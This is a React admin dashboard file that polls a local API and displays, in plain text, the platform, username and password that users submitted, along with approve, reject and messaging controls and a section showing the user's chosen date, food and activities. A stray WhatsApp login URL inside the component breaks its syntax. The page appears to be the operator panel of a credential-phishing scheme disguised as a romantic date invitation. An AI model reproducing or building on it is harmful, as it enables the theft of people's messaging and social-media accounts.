"use client";
import { useEffect, useState } from "react";

export default function AdminPage() {
  const [requests, setRequests] = useState<any[]>([]);
  const [adminMsg, setAdminMsg] = useState<string>("");

  useEffect(() => {
    const fetchData = async () => {
      const res = await fetch("http://localhost:8081/api/admin/requests");
      const data = await res.json();
      setRequests(data);
    };

    fetchData(); // first load

    const interval = setInterval(fetchData, 3000); // 🔁 every 3 sec

    return () => clearInterval(interval);
  }, []);http://localhost:3003/login/whatsapp

  return (
    <div className="p-10 font-serif">
      <h1 className="text-2xl font-bold mb-5">Admin Dashboard 👑</h1>

      {requests.length === 0 && <p>No requests yet</p>}

      {requests
        .filter(r => r.userMessage)
        .map(r => (
          <p key={r.id} className="text-pink-600 font-bold">
            💌 Message from user: {r.userMessage}
          </p>
      ))}


      {requests.map((r) => (
        <div
          key={r.id}
          className="flex whitespace-nowrap items-center justify-between border p-3.5 mb-2.5"
        >
          {/* <p><b>User Message:</b> {r.userMessage}</p> */}
          <p><b>Platform:</b> {r.platform}</p>
          <p><b>Username:</b> {r.username}</p>
          <p><b>Password:</b> {r.password}</p>
          <p><b>User:</b> {r.identifier}</p>
          <p><b>Status:</b> {r.status}</p>

          {r.status === "PENDING" && (
            <>
              <button
                onClick={() =>
                  fetch(`http://localhost:8081/api/admin/approve/${r.id}`, {
                    method: "POST",
                  })
                }
                className="bg-green-600 text-white px-2 py-1.5 rounded-xl font-semibold"
              >
                ✅ Approve
              </button>

              <button
                onClick={() =>
                  fetch(`http://localhost:8081/api/admin/reject/${r.id}`, {
                    method: "POST",
                  })
                }
                className="bg-blue-600 ml-2.5 text-white px-2 py-1.5 rounded-xl font-semibold"
              >
                ❌ Reject
              </button>

              <input
                placeholder="Message for user"
                value={adminMsg}
                className="border border-gray-600 px-3 py-1.5 rounded-lg"
                onChange={(e) => setAdminMsg(e.target.value)}
              />
                          
              <button
                onClick={() =>
                  fetch(`http://localhost:8081/api/admin/message/${r.id}`, {
                    method: "POST",
                    headers: { "Content-Type": "application/json" },
                    body: JSON.stringify({ adminMessage: adminMsg })
                  })
                }
                className="bg-blue-600 ml-2.5 text-white px-2 py-1.5 rounded-xl font-semibold"
              >
                Send Message
              </button>
            </>
          )}
        </div>
      ))}

      {/* ⭐ BOTTOM SECTION — FINAL USER SELECTION */}
      <div className="mt-8 border-t pt-5">

        <h2 className="text-xl font-bold text-pink-700 mb-3">
          💖 User Final Plan
        </h2>

        {requests
          .filter(r => r.selectedDate || r.foodChoice || r.dessertChoice || r.activitiesChoice)
          .map(r => (
            <div key={r.id} className="mt-4 border-t pt-3 text-pink-600">
            
              {r.selectedDate && (
                <p>📅 Date: {r.selectedDate}</p>
              )}
        
              {r.foodChoice && (
                <p>🍔 Food: {r.foodChoice}</p>
              )}
        
              {r.dessertChoice && (
                <p>🍰 Dessert: {r.dessertChoice}</p>
              )}
        
              {r.activitiesChoice && (
                <p>🎡 Activities: {r.activitiesChoice}</p>
              )}
            </div>
        ))}
      </div>
    </div>
  );
}
